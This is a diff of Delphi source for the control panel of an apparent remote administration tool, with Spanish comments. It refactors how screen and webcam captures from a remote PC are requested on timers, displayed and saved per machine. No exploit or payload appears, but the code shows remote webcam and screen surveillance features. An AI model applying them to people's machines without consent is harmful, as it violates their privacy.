@@ -416,7 +416,8 @@ type
   public  //Funciones públicas que podemos llamar desde otros Forms
     NombrePC: string; //Nombre del PC remoto
     RecibiendoJPG : boolean; //Recibiendo captura? o camara o thumbnail  (se usa desde UnitVisorDeMiniaturas)
-    AnchuraPantalla, AlturaPantalla : integer;//Altura y anchura de la pantalla del servidor Se usa desde ScreenMaxCap
+    AnchuraPantalla, AlturaPantalla : integer; //Altura y anchura de la pantalla del servidor
+    AnchuraWebCam, AlturaWebCam : integer;     //Altura y anchura de la webcam del servidor
     FormVisorCaptura : TObject;
     constructor Create(aOwner: TComponent; AThread: TIdPeerThread); overload;
     procedure OnRead(command: string; AThread: TIdPeerThread); overload;
@@ -624,7 +625,7 @@ var
   RealSize: string;
 begin
   Recibido := Command;
-  //  FormMain.Caption := Recibido; //Para debuggear!
+  // FormMain.Caption := Recibido; //Para debug
   if Recibido = 'CONNECTED?' then
     Exit;
   if Pos('CONNECTED?', Recibido) > 0 then
@@ -2187,11 +2188,12 @@ procedure TFormControl.BtnCapturarScreen1Click(Sender: TObject);
 begin
   if not Servidor.Connection.Connected then
   begin
-    //si tendriamos los timers activados esto petaria xD
-    ///MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
     Exit;
   end;
-  pedirJPG(0,'');
+
+  imgCaptura.Picture := nil; //Refrescamos
+  PedirJPG(0,'');
 end;
 
 
@@ -2238,16 +2240,16 @@ end;
 
 procedure TFormControl.BtnCapturarWebcamClick(Sender: TObject);
 begin
-
   if not Servidor.Connection.Connected then
   begin
-    //MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    exit;
+    MessageDlg('No estás conectado!', mtWarning, [mbOK], 0);
+    Exit;
   end;
 
-   if(ComboBoxWebcam.Items.Count=0) or (ComboBoxWebcam.text = '') then exit;
+  if(ComboBoxWebcam.Items.Count=0) or (ComboBoxWebcam.Items.Text = '') then Exit;
 
-   PedirJPG(1,'');
+  imgWebcam.Picture := nil; //Refrescamos
+  PedirJPG(1,'');
 end;
 
 procedure TFormControl.EnviarClickM(Sender: TObject; Button: TMouseButton;
@@ -2336,16 +2338,14 @@ end;
 
 procedure TFormControl.TimerCaptureScreenTimer(Sender: TObject);
 begin
-
   if not Servidor.Connection.Connected then
   begin
-   // MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     self.TimerCaptureScreen.Enabled := False;
     exit;
   end;
- BtnCapturarScreen.Click;
-
+  pedirJPG(0,'');
 end;
+
 
 //El popup de Descargar fichero añade el archivo al ListView de descargas, lo encola
 procedure TFormControl.Descargarfichero1Click(Sender: TObject);
@@ -2501,70 +2501,70 @@ begin
     AlturaPantalla := strtoint(FilePath);
     Delete(Buffer, 1, Pos('|', Buffer));
     Size := StrToInt(Trim(Buffer));
-
     BtnCapturarScreen.Enabled := False;
-
-    BtnCapturarScreen.Enabled := True;
     MS := TMemoryStream.Create;
     MS.Position := 0;
     GenericBar := ProgressBarScreen;
-
     ObtenerScreenCap_CamCap(AThread, Size, MS);
     MS.Position := 0;
     JPG := TJPEGImage.Create;
     JPG.LoadFromStream(MS);
-
-
-    if FormVisorCaptura<> nil then
+    if FormVisorCaptura <> nil then
     begin
-      (FormVisorCaptura as TScreenMax).ImgCaptura.picture.Assign(JPG)
+      (FormVisorCaptura as TScreenMax).ImgCaptura.Picture.Assign(JPG)
     end
     else
     begin
-      imgcaptura.Width := jpg.Width;
-      imgcaptura.picture.Assign(JPG);
-    end;
-    
-    labeltamano.caption := inttostr(ms.size div 1024); //Es interesante saber el tamaño
+      imgCaptura.Width := JPG.Width; //Establecemos ancho
+      imgCaptura.Height := JPG.Height; //Establecemos alto
+      imgcaptura.Picture.Assign(JPG);
+    end; 
+    LabelTamano.Caption := IntToStr(MS.Size div 1024); //Es interesante saber el tamaño
     if(PrefijoGuardarCaptura <> '') then
     begin
       InumeroCaptura := InumeroCaptura+1;
       CrearDirectoriosUsuario();
-      while fileexists(extractfiledir(paramstr(0))+'\Usuarios\'+NombrePc+'\Capturas\'+PrefijoGuardarCaptura+inttostr(InumeroCaptura)+'.jpg') do
+      while FileExists(extractfiledir(ParamStr(0))+'\Usuarios\'+NombrePc+'\Capturas\'+PrefijoGuardarCaptura+IntToStr(InumeroCaptura)+'.jpg') do
         PrefijoGuardarCaptura := PrefijoGuardarCaptura + '_';
-      MS.SaveToFile(extractfiledir(paramstr(0))+'\Usuarios\'+NombrePc+'\Capturas\'+PrefijoGuardarCaptura+inttostr(InumeroCaptura)+'.jpg');
+      MS.SaveToFile(extractfiledir(ParamStr(0))+'\Usuarios\'+NombrePc+'\Capturas\'+PrefijoGuardarCaptura+IntToStr(InumeroCaptura)+'.jpg');
     end;
     MS.Free;
     JPG.Free;
+    BtnCapturarScreen.Enabled := True;
     RecibiendoJPG := false;
   end
   else if Copy(PChar(Buffer), 1, 13) = 'CAPTURAWEBCAM' then
   begin
     Delete(Buffer, 1, Pos('|', Buffer));
     //FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
+    //AnchuraWebCam := StrToInt(Copy(FilePath, 1, Pos('¬', FilePath) - 1));
+    //Delete(FilePath, 1, Pos('¬', FilePath));
+    //AlturaWebCam := StrToInt(FilePath);
     Delete(Buffer, 1, Pos('|', Buffer));
-    Size := StrToInt(Trim(Buffer));
-    GenericBar := ProgressBarWebCam;
+		Size := StrToInt(Trim(Buffer));
+		BtnCapturarWebcam.Enabled := False;	
     MS := TMemoryStream.Create;
     MS.Position := 0;
+    GenericBar := ProgressBarWebCam;
     ObtenerScreenCap_CamCap(AThread, Size, MS);
     MS.Position := 0;
     JPG := TJPEGImage.Create;
     JPG.LoadFromStream(MS);
     imgWebcam.Width := JPG.Width; //Establecemos ancho
     imgWebcam.Height := JPG.Height; //Establecemos alto
-    imgWebcam.picture.Assign(JPG);
-    StatusBar.Panels[1].Text := inttostr(MS.Size div 1024)+'KB'; //Es interesante saber el tamaño
+    imgWebcam.Picture.Assign(JPG);
+    StatusBar.Panels[1].Text := IntToStr(MS.Size div 1024)+'KB'; //Es interesante saber el tamaño
     if(PrefijoGuardarWebcam <> '') then
     begin
       InumeroWebcam := InumeroWebcam+1;
       CrearDirectoriosUsuario();
-      while fileexists(extractfiledir(paramstr(0))+'\Usuarios\'+NombrePc+'\Webcam\'+PrefijoGuardarWebcam+inttostr(InumeroWebcam)+'.jpg') do
+      while FileExists(extractfiledir(ParamStr(0))+'\Usuarios\'+NombrePc+'\Webcam\'+PrefijoGuardarWebcam+IntToStr(InumeroWebcam)+'.jpg') do
         PrefijoGuardarWebcam := PrefijoGuardarWebcam + '_';
-      MS.SaveToFile(extractfiledir(paramstr(0))+'\Usuarios\'+NombrePc+'\Webcam\'+PrefijoGuardarWebcam+inttostr(InumeroWebcam)+'.jpg');
+      MS.SaveToFile(extractfiledir(ParamStr(0))+'\Usuarios\'+NombrePc+'\Webcam\'+PrefijoGuardarWebcam+IntToStr(InumeroWebcam)+'.jpg');
     end;
     MS.Free;
     JPG.Free;
+		BtnCapturarWebcam.Enabled := True;
     RecibiendoJPG := false;
   end
   else if Copy(PChar(Buffer), 1, 9) = 'THUMBNAIL' then
@@ -3376,31 +3376,23 @@ begin
       SpinCaptureScreen.Value := 0;
     if SpinCaptureScreen.Value > 30 then
       SpinCaptureScreen.Value := 30;
-    TimerCaptureScreen.Interval := SpinCaptureScreen.Value*1000+1;
+      TimerCaptureScreen.Interval := SpinCaptureScreen.Value*1000+250;
   except
   end;
 end;
 
+
 procedure TFormControl.CheckBoxAutoCapturaScreenClick(Sender: TObject);
 begin
-  if not Servidor.Connection.Connected then
+  if Self.CheckBoxAutoCapturaScreen.Checked then
   begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    Exit;
+    BtnCapturarScreen.click; //Hacemos la primera captura
   end;
 
-  if Self.CheckBoxAutoCapturaScreen.Checked then
-    BtnCapturarScreen.Click;
-
-//Desactivaron el automatico
-
-
-
-  TimerCaptureScreen.Interval := SpinCaptureScreen.Value*1000+1;
+  TimerCaptureScreen.Interval := SpinCaptureScreen.Value*1000+250;
   TimerCaptureScreen.Enabled  := CheckBoxAutoCapturaScreen.Checked;
-  TabScreenCap.Highlighted := TimerCaptureScreen.Enabled;//Para no olvidarnos que lo tenemos activo
+  TabScreenCap.Highlighted := TimerCaptureScreen.Enabled; //Para no olvidarnos que lo tenemos activo
 end;
-
 
 
 procedure TFormControl.Previsualizarjpg1Click(Sender: TObject);
@@ -3449,40 +3441,31 @@ begin
       SpinCam.Value := 0;
     if SpinCam.Value > 30 then
       SpinCam.Value := 30;
-    TimerCamCapture.Interval := SpinCam.Value*1000+1;
+    TimerCamCapture.Interval := SpinCam.Value*1000+250;
   except
   end;
 end;
 
 procedure TFormControl.CheckBoxAutoCamCaptureClick(Sender: TObject);
 begin
-  if not Servidor.Connection.Connected then
+  if Self.CheckBoxAutoCamCapture.Checked then
   begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    Exit;
+    BtnCapturarWebcam.Click; //Hacemos la primera captura
   end;
 
-  if Self.CheckBoxAutoCamCapture.Checked then
-    BtnCapturarWebcam.Click;
-            //Desactivaron el automatico
-
-
-  TimerCamCapture.Interval := SpinCam.Value*1000+1;
+  TimerCamCapture.Interval := SpinCam.Value*1000+250;
   TimerCamCapture.Enabled  := CheckBoxAutoCamCapture.Checked;
-  TabWebcam.Highlighted := TimerCamCapture.Enabled;
+	TabWebcam.Highlighted := TimerCamCapture.Enabled; //Para no olvidarnos que lo tenemos activo
 end;
 
 procedure TFormControl.TimerCamCaptureTimer(Sender: TObject);
 begin
-
   if not Servidor.Connection.Connected then
   begin
-   // MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
     self.TimerCamCapture.Enabled := False;
     exit;
   end;
-  BtnCapturarWebcam.Click;
-
+  PedirJPG(1,'');
 end;
 
 procedure TFormControl.CheckBoxMostrarVentanasOcultasClick(
@@ -3741,11 +3724,11 @@ end;
 
 procedure TFormControl.TabScreencapShow(Sender: TObject);
 begin
-   Servidor.Connection.Writeln('DATOSCAPSCREEN');
-   if(FormOpciones.CheckBoxAutoRefrescar.checked) then
-   begin
+  Servidor.Connection.Writeln('DATOSCAPSCREEN');
+  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
+  begin
     BtnCapturarScreen.click;
-   end;
+  end;
 end;
 
 procedure TFormControl.TabWebcamShow(Sender: TObject);
